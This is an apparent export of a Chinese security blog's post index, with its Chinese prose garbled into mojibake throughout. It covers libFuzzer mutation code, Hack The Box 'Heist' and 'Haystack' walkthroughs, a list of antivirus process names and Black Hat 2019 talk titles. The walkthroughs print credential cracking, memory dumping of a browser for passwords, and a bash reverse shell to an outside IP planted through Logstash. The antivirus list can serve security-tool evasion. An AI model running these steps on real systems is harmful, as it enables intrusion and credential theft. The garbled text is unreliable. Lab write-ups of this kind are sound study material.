MaxSize, Rand.Rand());&#125; CustomCrossOverè°ƒç”¨ç”¨æˆ·è‡ªå®šä¹‰å®žçŽ°çš„æ•°æ®äº¤å‰æ–¹æ³•ã€‚ 123456789101112131415161718size_t MutationDispatcher::Mutate_CustomCrossOver(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size == 0) return 0; if (!CrossOverWith) return 0; const Unit &amp;Other = *CrossOverWith; if (Other.empty()) return 0; CustomCrossOverInPlaceHere.resize(MaxSize); auto &amp;U = CustomCrossOverInPlaceHere; size_t NewSize = EF-&gt;LLVMFuzzerCustomCrossOver( Data, Size, Other.data(), Other.size(), U.data(), U.size(), Rand.Rand()); if (!NewSize) return 0; assert(NewSize &lt;= MaxSize &amp;&amp; "CustomCrossOver returned overisized unit"); memcpy(Data, U.data(), NewSize); return NewSize;&#125; ç­–ç•¥é€‰æ‹©LibFuzzeréšæœºé€‰æ‹©ç¼–è¯‘ç­–ç•¥ï¼Œå…¶å…³é”®ä»£ç ä½äºŽ515è¡Œã€‚ 123456789101112131415161718192021// Mutates Data in place, returns new size.size_t MutationDispatcher::MutateImpl(uint8_t *Data, size_t Size, size_t MaxSize, Vector&lt;Mutator&gt; &amp;Mutators) &#123; assert(MaxSize &gt; 0); // Some mutations may fail (e.g. can't insert more bytes if Size == MaxSize), // in which case they will return 0. // Try several times before returning un-mutated data. for (int Iter = 0; Iter &lt; 100; Iter++) &#123; auto M = Mutators[Rand(Mutators.size())]; // è¿™é‡Œ size_t NewSize = (this-&gt;*(M.Fn))(Data, Size, MaxSize); if (NewSize &amp;&amp; NewSize &lt;= MaxSize) &#123; if (Options.OnlyASCII) ToASCII(Data, NewSize); CurrentMutatorSequence.push_back(M); return NewSize; &#125; &#125; *Data = ' '; return 1; // Fallback, should not happen frequently.&#125; éšæœºé€‰æ‹©ç¼–è¯‘ç­–ç•¥çš„æ–¹æ³•æ˜Žæ˜¾æœ‰æ‰€ä¸è¶³ï¼Œå› æ­¤æœ‰å­¦è€…å¯¹æ­¤è¿›è¡Œäº†æ”¹è¿›ï¼Œæ¯”å¦‚FuzzerGym: A Competitive Framework for Fuzzing and Learningï¼Œæ”¹è®ºæ–‡é‡‡ç”¨å¼ºåŒ–å­¦ä¹ ï¼ˆDQNï¼‰çš„æ–¹æ³•æ¥æ”¹è¿›fuzzçš„æ•ˆçŽ‡ï¼Œåœ¨æ­¤æ„Ÿè°¢Drozdæ•™æŽˆçš„æŒ‡å¯¼ã€‚ æ€»ç»“æœ¬æ–‡æ€»ç»“ä»‹ç»äº†LibFuzzerçš„å˜å¼‚ç­–ç•¥ï¼Œæœ‰åŠ©äºŽæˆ‘ä»¬å¯¹å…¶è¿›è¡Œè¿›ä¸€æ­¥çš„æ”¹è¿›ã€‚]]></content>
      <categories>
        <category>æ¨¡ç³Šæµ‹è¯•</category>
      </categories>
      <tags>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hackthebox-Postman]]></title>
    <url>%2F2019%2F12%2F02%2Fhackthebox-Postman%2F</url>
    <content type="text"><![CDATA[åŽŸæ–‡æ ‡é¢˜ (æ—¥æœŸ) ä½œè€…ï¼š åŽŸæ–‡åœ°å€]]></content>
  </entry>
  <entry>
    <title><![CDATA[hackthebox-Heist]]></title>
    <url>%2F2019%2F11%2F03%2Fhackthebox-Heist%2F</url>
    <content type="text"><![CDATA[ä¸åŒç”¨æˆ·åå¯èƒ½å¯¹åº”ç›¸åŒçš„å¯†ç  nmapæ‰«æï¼Œ-p1-65535ï¼Œå¾—åˆ°ç«¯å£80ã€135ã€445ã€5985ã€49668 123456789101112131480/tcp open http Microsoft IIS httpd 10.0| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Support Login Page|_Requested resource was login.php135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds?5985/tcp open wsman49668/tcp open unknown æŸ¥çœ‹http://10.10.10.149ï¼Œåœ¨Login as guestä¸­ä¸‹è½½Attachmentçš„config.txt 1234567891011121314151617181920212223242526272829303132333435363738394041version 12.2no service padservice password-encryption!isdn switch-type basic-5ess!hostname ios-1!security passwords min-length 12enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91!username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408!!ip ssh authentication-retries 5ip ssh version 2!!router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0 mask 300.255.255.0 timers bgp 3 9 redistribute connected!ip classlessip route 0.0.0.0 0.0.0.0 192.168.0.1!!access-list 101 permit ip any anydialer-list 1 protocol ip list 101!no ip http serverno ip http secure-server!line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh config.txtä¸­æåˆ°Ciscoçš„3ä¸ªå¯†ç ï¼Œ2ä¸ªä¸ºtype7å¯ç›´æŽ¥è§£å¯†ï¼Œ1ä¸ªä¸ºtype5ä½¿ç”¨hashcatè§£å¯†ï¼›åŒæ—¶æœé›†åˆ°ä¸‰ä¸ªç”¨æˆ·årout3rã€adminã€Hazardï¼ŒæŽ¨æµ‹Hazardå’Œtype5çš„å¯†ç stealth1agentæœ‰å…³ ä½¿ç”¨impacketçš„lookupsid.pyæœç´¢å…¶å®ƒç”¨æˆ·åï¼Œå‘çŽ°supportã€Chaseå’ŒJason 1./lookupsid.py Hazard:stealth1agent@10.10.10.149 ä½¿ç”¨evil-winrmï¼Œç”¨ä¸Šè¿°å‘çŽ°çš„ç”¨æˆ·åå’Œå¯†ç ç»„æˆçš„å­—å…¸è¿›è¡Œçˆ†ç ´ï¼ŒèŽ·å¾—Chaseçš„å¯†ç  1ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d' èŽ·å¾—user.txt æŸ¥çœ‹Usersç›®å½•å‘çŽ°ä¸»æœºç”¨æˆ·æœ‰Administratorã€Chaseå’ŒHazard æžšä¸¾è¿›ç¨‹ï¼Œå‘çŽ°firefox åœ¨evil-winrmä¸­uploadå·¥å…·procdump64.exeï¼Œå°†firefoxçš„è¿›ç¨‹å†…å­˜dumpä¸‹æ¥ 1./Procdump64.exe -accepteula -ma 6276 firefox-6276.dmp æœç´¢å†…å­˜å¾—åˆ°æ–°å¯†ç  12select-string firefox-6276.dmp -pattern "password"// login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ&amp;login= ä½¿ç”¨evil-winrmä»¥Administratorå’Œæ–°å¯†ç ç™»å½•ï¼ŒèŽ·å¾—root.txt]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
        <category>hackthebox</category>
      </categories>
      <tags>
        <tag>hackthebox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hackthebox-Haystack]]></title>
    <url>%2F2019%2F11%2F03%2Fhackthebox-Haystack%2F</url>
    <content type="text"><![CDATA[ä½¿ç”¨nmapæ‰«æåˆ°ç«¯å£22ã€80ã€9200ï¼ˆElasticSearch 6.4.2ï¼‰ 1234567891011121322/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)| 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)|_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)80/tcp open http nginx 1.12.2|_http-server-header: nginx/1.12.2|_http-title: Site doesn't have a title (text/html).9200/tcp open http nginx 1.12.2| http-methods: |_ Potentially risky methods: DELETE|_http-server-header: nginx/1.12.2|_http-title: Site doesn't have a title (application/json; charset=UTF-8). è®¿é—®http://10.10.10.115å¾—åˆ°å›¾ç‰‡needle.jpgï¼Œ`Stegsolve`æŸ¥çœ‹å›¾ç‰‡å¯è§base64çš„æç¤ºï¼Œè§£ç å¾—è¥¿ç­ç‰™è¯­å¾—æç¤º 12la aguja en el pajar es "clave"the needle in the haystack is "key" ä½¿ç”¨elasticsearch-dumpèŽ·å–9200çš„quotesæ•°æ®ï¼Œåœ¨æ•°æ®ä¸­æœç´¢å¯å¾—åˆ°ä¸¤ä¸ªbase64åŠ å¯†çš„æ•°æ®ï¼ˆæœç´¢base64å¾—ç‰¹å¾å­—ç¬¦ï¼Œæ¯”å¦‚=ï¼‰ï¼Œåˆ†åˆ«ä¸ºç”¨æˆ·åå’Œå¯†ç ï¼Œè§£ç ä¸ºsecurityå’Œspanish.is.key 1elasticdump --input=http://10.10.10.115:9200/quotes --output=quotes.json --type=data ä½¿ç”¨sshç™»å½•èŽ·å¾—user.txt ä½¿ç”¨scpä¸Šä¼ LinEnumèŽ·å–ç›®æ ‡æœºå™¨ä¿¡æ¯ï¼Œé¦–å…ˆå‘çŽ°logstashä»¥rootæƒé™è¿è¡Œï¼ŒæŸ¥çœ‹/etc/logstash/conf.d/çš„é…ç½®æ–‡ä»¶ï¼Œå‘çŽ°å…¶éœ€è¦rootæˆ–kibanaæƒé™æ‰å¯ä»¥æŸ¥çœ‹ åˆ©ç”¨CVE-2018-17246èŽ·å–kibanaçš„shell æŸ¥çœ‹/etc/logstash/conf.d/çš„é…ç½®æ–‡ä»¶ï¼Œå‘çŽ°logstashæ¯10sè¯»å–/opt/kibana/logstash_*çš„å†…å®¹å¹¶åœ¨è¿‡æ»¤åŽæ‰§è¡Œï¼Œåˆ™echo &quot;Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.14.52/22222 0&gt;&amp;1&quot; &gt; /opt/kibana/logstash_ertï¼ˆå¯è‡ªè¡Œæ­å»ºkibanaï¼Œä½¿ç”¨å…¶grokè°ƒè¯•å™¨æµ‹è¯•è¿‡æ»¤æ•ˆæžœï¼‰ï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´èŽ·å–è¿”å›žçš„shell 123456789101112131415161718192021222324252627282930cat /etc/logstash/conf.d/filter.conffilter &#123; if [type] == "execute" &#123; grok &#123; match =&gt; &#123; "message" =&gt; "Ejecutar\s*comando\s*:\s+%&#123;GREEDYDATA:comando&#125;" &#125; &#125; &#125;&#125;cat /etc/logstash/conf.d/input.confinput &#123; file &#123; path =&gt; "/opt/kibana/logstash_*" start_position =&gt; "beginning" sincedb_path =&gt; "/dev/null" stat_interval =&gt; "10 second" type =&gt; "execute" mode =&gt; "read" &#125;&#125;cat /etc/logstash/conf.d/output.confoutput &#123; if [type] == "execute" &#123; stdout &#123; codec =&gt; json &#125; exec &#123; command =&gt; "%&#123;comando&#125; &amp;" &#125; &#125;&#125; èŽ·å¾—root.txt]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
        <category>hackthebox</category>
      </categories>
      <tags>
        <tag>hackthebox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å®‰å…¨è½¯ä»¶ç›¸å…³åç§°æœé›†]]></title>
    <url>%2F2019%2F10%2F10%2F%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3%E5%90%8D%E7%A7%B0%E6%90%9C%E9%9B%86%2F</url>
    <content type="text"><![CDATA[å®‰å…¨è½¯ä»¶ç›¸å…³åç§°æœé›†ï¼ŒåŒ…æ‹¬è¿›ç¨‹åç­‰ã€‚ è¿›ç¨‹å A B 360tray.exe 360å®‰å…¨å«å£« 360sd.exe 360æ€æ¯’ a2guard.exe a-squaredæ€æ¯’ ad-watch.exe Lavasoftæ€æ¯’ cleaner8.exe The Cleaneræ€æ¯’ vba32lder.exe vb32æ€æ¯’ MongoosaGUI.exe Mongoosaæ€æ¯’ CorantiControlCenter32.exe Coranti2012æ€æ¯’ F-PROT.EXE F-PROTæ€æ¯’ CMCTrayIcon.exe CMCæ€æ¯’ K7TSecurity.exe K7æ€æ¯’ UnThreat.exe UnThreatæ€æ¯’ CKSoftShiedAntivirus4.exe Shield Antivirusæ€æ¯’ AVWatchService.exe VIRUSfighteræ€æ¯’ ArcaTasksService.exe ArcaViræ€æ¯’ iptray.exe Immunetæ€æ¯’ PSafeSysTray.exe PSafeæ€æ¯’ nspupsvc.exe nProtectæ€æ¯’ SpywareTerminatorShield.exe SpywareTerminatoræ€æ¯’ BKavService.exe Bkavæ€æ¯’ MsMpEng.exe Microsoft Security Essentials SBAMSvc.exe VIPRE ccSvcHst.exe Nortonæ€æ¯’ QQ.exe QQ f-secure.exe å†°å²› avp.exe å¡å·´æ–¯åŸº KvMonXP.exe æ±Ÿæ°‘æ€æ¯’ RavMonD.exe ç‘žæ˜Ÿæ€æ¯’ Mcshield.exe éº¦å’–å•¡ egui.exe NOD32 kxetray.exe é‡‘å±±æ¯’éœ¸ knsdtray.exe å¯ç‰›æ€æ¯’ TMBMSRV.exe è¶‹åŠ¿æ€æ¯’ avcenter.exe Avira(å°çº¢ä¼ž) ashDisp.exe Avastç½‘ç»œå®‰å…¨ rtvscan.exe è¯ºé¡¿æ€æ¯’ ksafe.exe é‡‘å±±å«å£« QQPCRTP.exe QQç”µè„‘ç®¡å®¶ Miner.exe æµé‡çŸ¿çŸ³ AYAgent.aye éŸ©å›½èƒ¶å›Š patray.exe å®‰åšå£« V3Svc.exe å®‰åšå£«V3 avgwdsvc.exe AVGæ€æ¯’ ccSetMgr.exe èµ›é—¨é“å…‹ QUHLPSVC.EXE QUICK HEALæ€æ¯’ mssecess.exe å¾®è½¯æ€æ¯’ SavProgress.exe Sophosæ€æ¯’ fsavgui.exe F-Secureæ€æ¯’ vsserv.exe æ¯”ç‰¹æ¢µå¾· remupd.exe ç†ŠçŒ«å«å£« FortiTray.exe é£žå¡” safedog.exe å®‰å…¨ç‹— parmor.exe æœ¨é©¬å…‹æ˜Ÿ beikesan.exe è´å£³äº‘å®‰å…¨ KSWebShield.exe é‡‘å±±ç½‘ç›¾ TrojanHunter.exe æœ¨é©¬çŒŽæ‰‹ GG.exe å·¨ç›¾ç½‘æ¸¸å®‰å…¨ç›¾ adam.exe ç»¿é¹°å®‰å…¨ç²¾çµ AST.exe è¶…çº§å·¡è­¦ ananwidget.exe å¢¨è€…å®‰å…¨ä¸“å®¶ AVK.exe GData ccapp.exe Symantec Norton avg.exe AVG Anti-Virus spidernt.exe Dr.web Mcshield.exe Mcafee avgaurd.exe Avira Antivir F-PROT.exe F-Prot AntiVirus vsmon.exe ZoneAlarm avp.exee Kaspersky cpf.exe Comodo outpost.exe Outpost Firewall rfwmain.exe ç‘žæ˜Ÿé˜²ç«å¢™ kpfwtray.exe é‡‘å±±ç½‘é•– FYFireWall.exe é£Žäº‘é˜²ç«å¢™ MPMon.exe å¾®ç‚¹ä¸»åŠ¨é˜²å¾¡ pfw.exe å¤©ç½‘é˜²ç«å¢™ S.exe åœ¨æŠ“é¸¡ 1433.exe åœ¨æ‰«1433 DUB.exe åœ¨çˆ†ç ´ ServUDaemon.exe å‘çŽ°S-U BaiduSdSvc.exe ç™¾åº¦æ€è½¯ SafeDogGuardCenter.exe,safedogupdatecenter.exe,safedogguardcenter.exe,SafeDogSiteIIS.exe,SafeDogTray.exe,SafeDogServerUI.exe å®‰å…¨ç‹— D_Safe_Manage.exe,d_manage.exe Dç›¾ yunsuo_agent_service.exe,yunsuo_agent_daemon.exe äº‘é” HwsPanel.exe,hws_ui.exe,hws.exe,hwsd.exe æŠ¤å«ç¥ž HipsDaemon.exe,HipsTray.exe,wsctrl.exe,usysdiag.exe ç«ç»’]]></content>
      <categories>
        <category>å®‰å…¨å¼€å‘</category>
      </categories>
      <tags>
        <tag>ä¿¡æ¯æœé›†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Black Hat USA 2019 Briefingsä¸€è§ˆ]]></title>
    <url>%2F2019%2F08%2F14%2FBlack-Hat-USA-2019-Briefings%E4%B8%80%E8%A7%88%2F</url>
    <content type="text"><![CDATA[è®®é¢˜åœ°å€ ä¼šè®®è§†é¢‘ çˆ¬è™«å¯¼å…¥ Neo4j Briefings åœ¨ 8.7~8.8 ä¸¾è¡Œï¼Œå…± 21 ç±»ï¼Œ123 ä¸ªè®®é¢˜ TRACKS Malware 6 Exploit Development 17 Platform Security 13 Community 8 Applied Security 21 Hardware/Embedded 17 Human Factors 12 Cyber Insurance 3 Reverse Engineering 11 Web AppSec 15 Enterprise 12 Internet of Things 8 Cryptography 5 Mobile 12 Policy 12 Security Development Lifecycle 11 Smart Grid/Industrial Security 5 Data Forensics/Incident Response 9 Network Defense 13 Bug Bounty 3 Keynote 1 TITLES Titles Speakers Tracks 1 Flying a False Flag: Advanced C2, Trust Conflicts, and Domain Takeover GitHub Nick Landers Malware 2 Battle of Windows Service: A Silver Bullet to Discover File Privilege Escalation Bugs Automatically Wenxu Wu Exploit Development,Platform Security 3 Hacking Your Non-Compete Brian Dykstra,Gregory Stone Community 4 He Said, She Said â€“ Poisoned RDP Offense and Defense Eyal Itkin,Dana Baril Exploit Development,Applied Security 5 Lessons and Lulz: The 5th Annual Black Hat USA NOC Report Bart Stump,Neil Wyler Applied Security 6 Biometric Authentication Under Threat: Liveness Detection Hacking Zhuo Ma,Bin Ma,Yu Chen Hardware/Embedded,Human Factors 7 How Do Cyber Insurers View The World? Matt Prevost Cyber Insurance 8 Hunting for Bugs, Catching Dragons å¯¹ Outlook/Exchange æ¼æ´žåŠåˆ©ç”¨çš„æ€»ç»“ Nicolas Joly Reverse Engineering,Exploit Development 9 Internet-Scale Analysis of AWS Cognito Security Andres Riancho Web AppSec,Enterprise 10 Moving from Hacking IoT Gadgets to Breaking into One of Europeâ€™s Highest Hotel Suites Michael Huebler,Ray . Hardware/Embedded,Internet of Things 11 Messaging Layer Security: Towards a New Era of Secure Group Messaging Katriel Cohn-Gordon,Raphael Robert,Benjamin Beurdouche Applied Security,Cryptography 12 Bypassing the Maginot Line: Remotely Exploit the Hardware Decoder on Smartphone Peter Pi,Xiling Gong Exploit Development,Mobile 13 The Cyber Shell Game â€“ War, Information Warfare, and the Darkening Web Alexander Klimburg Policy 14 Cybersecurity Risk Assessment for Safety-Critical Systems Daniel Johnson,Ken Heffner,Ly Vessels Security Development Lifecycle,Smart Grid/Industrial Security 15 ClickOnce and Youâ€™re in - When Appref-ms Abuse is Operating as Intended William Burke Human Factors,Applied Security 16 Deconstructing the Phishing Campaigns that Target Gmail Users Daniela Oliveira,Elie Bursztein Human Factors 17 Detecting Deep Fakes with Mice Alex Comerford,Jonathan Saunders,George Williams Human Factors,Data Forensics/Incident Response 18 Defense Against Rapidly Morphing DDOS Mikhail Fedorov,Mudit Tyagi Enterprise,Network Defense 19 Detecting Malicious Files with YARA Rules as They Traverse the Network David Bernal Data Forensics/Incident Response,Network Defense 20 Going Beyond Coverage-Guided Fuzzing with Structured Fuzzing Jonathan Metzman Security Development Lifecycle 21 Paging All Windows Geeks â€“ Finding Evil in Windows 10 Compressed Memory Dimiter Andonov,Omar Sardar Reverse Engineering,Data Forensics/Incident Response 22 MINimum Failure - Stealing Bitcoins with Electromagnetic Fault Injection Colin Oâ€™Flynn Mobile,Hardware/Embedded 23 PeriScope: An Effective Probing and Fuzzing Framework for the Hardware-OS Boundary Dokyung Song Platform Security,Mobile 24 Reverse Engineering WhatsApp Encryption for Chat Manipulation and More Oded Vanunu,Roman Zaikin Reverse Engineering,Web AppSec 25 Legal GNSS Spoofing and its Effects on Autonomous Vehicles Victor Murray Hardware/Embedded,Internet of Things 26 Transparency in the Software Supply Chain: Making SBOM a Reality Allan Friedman Security Development Lifecycle,Policy 27 Monsters in the Middleboxes: Building Tools for Detecting HTTPS Interception Gabriele Fisher,Luke Valenta Web AppSec,Network Defense 28 Attack Surface as a Service Anna Westelius Web AppSec 29 Death to the IOC: Whatâ€™s Next in Threat Intelligence Bhavna Soman Enterprise,Data Forensics/Incident Response 30 GDPArrrrr: Using Privacy Laws to Steal Identities James Pavur Human Factors,Policy 31 SSO Wars: The Token Menace Oleksandr Mirosh,Alvaro Munoz Enterprise,Web AppSec 32 Mobile Interconnect Threats: How Next-Gen Products May be Already Outdated Guillaume Teissier Exploit Development,Network Defense 33 On Trust: Stories from the Front Lines Jamil Farshchi Enterprise 34 Shifting Knowledge Left: Keeping up with Modern Application Security Fletcher Heisler,Mark Stanislav Human Factors,Security Development Lifecycle 35 APICâ€™s Adventures in Wonderland Frank Block,Oliver Matula Exploit Development,Network Defense 36 Testing Your Organizationâ€™s Social Media Awareness Jacob Wilkin Human Factors 37 The Future of Securing Intelligent Electronic Devices Using the IEC 62351-7 Standard for Monitoring Younes Dragoni,Alessandro Di Pinto,Andrea Carcano Smart Grid/Industrial Security 38 Attacking and Defending the Microsoft Cloud (Office 365 &amp; Azure AD) Mark Morowczynski,Sean Metcalf Network Defense,Enterprise 39 WebAuthn 101 - Demystifying WebAuthn Christiaan Brand Web AppSec,Applied Security 40 Woke Hiring Wonâ€™t Save Us: An Actionable Approach to Diversity Hiring and Retention Rebecca Lynch Policy,Community 41 100 Seconds of Solitude: Defeating Cisco Trust Anchor With FPGA Bitstream Shenanigans Ang Cui,Richard Housley,Jatin Kataria Reverse Engineering,Hardware/Embedded 42 Attacking Electric Motors for Fun and Profit Duminda Wijesekera,Matthew Jablonski Internet of Things,Smart Grid/Industrial Security 43 All Your Apple are Belong to Us: Unique Identification and Cross-Device Tracking of Apple Devices Xiaolong Bai,Min Zheng Applied Security,Mobile 44 Behind the Scenes: The Industry of Social Media Manipulation Driven by Malware Olivier Bilodeau,Masarah Paquet-Clouston Malware,Human Factors 45 Breaking Through Another Side: Bypassing Firmware Security Boundaries from Embedded Controller Alexandre Gazet,Alex Matrosov Platform Security,Reverse Engineering 46 Denial of Service with a Fistful of Packets: Exploiting Algorithmic Complexity Vulnerabilities David Renardy,Nathan Hauke Exploit Development,Web AppSec 47 Information Security in the Public Interest Bruce Schneier Policy,Community 48 Planning a Bug Bounty: The Nuts and Bolts from Concept to Launch Adam Ruddermann Bug Bounty 49 Dragonblood: Attacking the Dragonfly Handshake of WPA3 Mathy Vanhoef Network Defense,Cryptography 50 Exploiting the Hyper-V IDE Emulator to Escape the Virtual Machine Joe Bialek Platform Security,Exploit Development 51 Playing Offense and Defense with Deepfakes Matt Price,Mike Price Human Factors 52 Project Zero: Five Years of â€˜Make 0Day Hardâ€™ Ben Hawkes Platform Security,Exploit Development 53 Hacking for the Greater Good: Empowering Technologists to Strengthen Digital Society Eva Galperin,Camille Francois,Bruce Schneier Community 54 Rough and Ready: Frameworks to Measure Persistent Engagement and Deterrence Neil Jenkins,Jason Healey Data Forensics/Incident Response,Policy 55 The Enemy Within: Modern Supply Chain Attacks Eric Doerr Data Forensics/Incident Response,Enterprise 56 PicoDMA: DMA Attacks at Your Fingertips Ben Blaxill,Joel Sandin Platform Security,Hardware/Embedded 57 API-Induced SSRF: How Apple Pay Scattered Vulnerabilities Across the Web Joshua Maddux Applied Security,Web AppSec 58 Bounty Operations: Best Practices and Common Pitfalls to Avoid in the First 6-12 Months Josh Jay,Greg Caswell,Shannon Sabens,Jarek Stanley Bug Bounty 59 The Most Secure Browser? Pwning Chrome from 2016 to 2019 Gengming Liu,Zhen Feng Exploit Development,Platform Security 60 Breaking Encrypted Databases: Generic Attacks on Range Queries Marie-Sarah Lacharite Cryptography 61 DevSecOps : What, Why and How Anant Shrivastava Security Development Lifecycle,Applied Security 62 Finding Our Path: How Weâ€™re Trying to Improve Active Directory Securityä»‹ç» BloodHoundï¼ŒBloodHound å°†èŽ·å– Domain Admin æ–¹å¼ä»¥åœ°å›¾æ–¹å¼å±•ç¤ºå‡ºæ¥ï¼Œå¹¶ä¸”èƒ½è®¡ç®—å‡ºæœ€ä½³è·¯å¾„ï¼Œå¤§å¤§æé«˜äº†åŸŸæ¸—é€çš„æ•ˆçŽ‡ Will Schroeder,Rohan Vazarkar,Andy Robbins Enterprise 63 All the 4G Modules Could be Hackedç™¾åº¦å®‰å…¨å®žéªŒå®¤ï¼Œç§»åŠ¨ç½‘ç»œ 4G å®‰å…¨æ”»å‡»é¢ Zhang Ye,Zheng Huang,Haikuo Xie,Shupeng Gao Hardware/Embedded,Internet of Things 64 Operational Templates for State-Level Attack and Collective Defense of Countries Robert Fanelli,Gregory Conti Applied Security,Network Defense 65 Process Injection Techniques - Gotta Catch Them AllWindows 10 x64 è¿›ç¨‹æ³¨å…¥æŠ€æœ¯æ€»ç»“ï¼ˆæœ‰å¼€æºä»£ç ï¼‰ï¼ŒCFG å’Œ CIG å¯¹å„ç§æŠ€æœ¯çš„å½±å“ Amit Klein,Itzik Kotler Exploit Development,Malware 66 Rogue7: Rogue Engineering-Station Attacks on S7 Simatic PLCs Eli Biham,Avishai Wool,Sara Bitan,Uriel Malin Reverse Engineering,Smart Grid/Industrial Security 67 Behind the Scenes of Intel Security and Manageability Engine Yanai Moyal,Shai Hasarfaty Applied Security,Hardware/Embedded 68 Women in Security: Building a Female InfoSec Community in Korea, Japan, and Taiwan Hazel Yen,Suhee Kang,Asuka Nakajima Community 69 Cyber Insurance 101 for CISOâ€™s Jeffrey Smith Cyber Insurance 70 0-days &amp; Mitigations: Roadways to Exploit and Secure Connected BMW Cars Hendrik Schweppe,Michael Gruffke,Wenkai Zhang,Aohui Wang,Zhiqiang Cai Hardware/Embedded,Internet of Things 71 Behind the scenes of iOS and Mac Security Ivan KrstiÄ‡ Mobile,Platform Security 72 HTTP Desync Attacks: Smashing into the Cell Next Door James Kettle Web AppSec 73 Exploiting Qualcomm WLAN and Modem Over The Airè…¾è®¯å®‰å…¨ Blade Teamï¼Œåˆ©ç”¨ WiFi æ¼æ´ž RCE Peter Pi,Xiling Gong Exploit Development,Mobile 74 Firmware Cartography: Charting the Course for Modern Server Compromise Dionysus Blazakis,Nathan Keltner Platform Security,Hardware/Embedded 75 Ghidra - Journey from Classified NSA Tool to Open Source Chris Delikat,Brian Knighton Reverse Engineering 76 Iâ€™m Unique, Just Like You: Human Side-Channels and Their Implications for Security and Privacy Matt Wixey Applied Security,Human Factors 77 Infighting Among Russian Security Services in the Cyber Sphere Kimberly Zenz Policy 78 Itâ€™s Not What You Know, Itâ€™s What You Do: How Data Can Shape Security Engagement Aika Sengirbay,Masha Sedova Human Factors 79 Managing for Success: Maintaining a Healthy Bug Bounty Program Long Term Chloe Brown Bug Bounty 80 Practical Approach to Automate the Discovery and Eradication of Open-Source Software Vulnerabilities at Scale Aladdin Almubayed Web AppSec,Security Development Lifecycle 81 New Vulnerabilities in 5G Networks5G å•†ç”¨ç½‘ç»œçš„æ¼æ´žï¼Œæ¼æ´žå¯è¢«åˆ©ç”¨å®žçŽ°ä¸­é—´äººåŠ«æŒå’Œå®šå‘æ”»å‡» Ravishankar Borgaonkar,Altaf Shaik Network Defense,Mobile 82 Predictive Vulnerability Scoring System Jay Jacobs,Michael Roytman Network Defense,Enterprise 83 Selling 0-Days to Governments and Offensive Security Companieså¯¹ 0-Day å¸‚åœºä¹°å–äº¤æ˜“åŒæ–¹çš„ä»‹ç»ï¼ˆå’Œ ISC2019 çš„ç›¸åŒï¼‰ Maor Shwartz,Maor Shwartz Policy,Community,Policy,Community 84 Zombie Ant Farming: Practical Tips for Playing Hide and Seek with Linux EDRs Dimitry Snezhkov Applied Security,Malware 85 Automation Techniques in C++ Reverse Engineering Rolf Rolles Reverse Engineering 86 Backdooring Hardware Devices by Injecting Malicious Payloads on Microcontrollers Sheila Ayelen Berta Reverse Engineering,Hardware/Embedded 87 Sensor and Process Fingerprinting in Industrial Control Systems Mujeeb Ahmed Chuadhry,Martin Ochoa Applied Security,Smart Grid/Industrial Security 88 Critical Zero Days Remotely Compromise the Most Popular Real-Time OS Dor Zusman,Ben Seri Network Defense,Internet of Things 89 Fantastic Red-Team Attacks and How to Find Them Ross Wolf,Casey Smith Applied Security,Data Forensics/Incident Response 90 The Path Less Traveled: Abusing Kubernetes Defaults Duffie Cooley,Ian Coldwater Platform Security 91 Inside the Apple T2 Jeremy Erickson,Mikhail Davidov Hardware/Embedded,Platform Security 92 Chip.Fail - Glitching the Silicon of the Connected World Josh Datko,Thomas Roth Internet of Things,Hardware/Embedded 93 Making Big Things Better the Dead Cow Way Luke Benfey,Christien Rioux,Peiter Mudge Zatko,Joseph Menn Community 94 Come Join the CAFSA - Continuous Automated Firmware Security Analysiså›ºä»¶åˆ†æžå·¥å…· FwAnalyzer çš„è¯¦ç»†ä»‹ç»ï¼Œé’ˆå¯¹æ–‡ä»¶ç³»ç»Ÿçš„é™æ€åˆ†æžï¼Œå¹¶ä¸é’ˆå¯¹æ¼æ´žå‘çŽ°ï¼Œä¼šæ£€æµ‹ä¸€äº›æ–‡ä»¶çš„æƒé™ï¼Œæ˜¯å¦åŒ…å«ä¸€äº›å®‰å…¨æœºåˆ¶ç­‰ï¼Œå¹¶å½¢æˆä¸€ä¸ªåˆ†æžæŠ¥å‘Šã€‚ Collin Mulliner Hardware/Embedded,Security Development Lifecycle 95 Preventing Authentication Bypass: A Tale of Two Researchers Ravi Jaiswal,Ron Chan,Terry Zhang Applied Security,Security Development Lifecycle 96 Securing the System: A Deep Dive into Reversing Android Pre-Installed AppsGoogle Project Zeroï¼ŒAndroid ç³»ç»Ÿé¢„è£… App çš„é€†å‘æ·±åº¦åˆ†æž Maddie Stone Reverse Engineering,Mobile 97 Towards Discovering Remote Code Execution Vulnerabilities in Apple FaceTimeç›˜å¤ï¼ŒApple FaceTime çš„æž¶æž„ã€ç›¸å…³æ”»å‡»é¢ä»¥åŠä¸€äº›æ¼æ´ž Tielei Wang,Tao Huang Exploit Development 98 Finding a Needle in an Encrypted Haystack: Leveraging Cryptographic Abilities to Detect the Most Prevalent Attacks on Active Directory Yaron Zinar,Marina Simakov Network Defense,Enterprise 99 A Compendium of Container 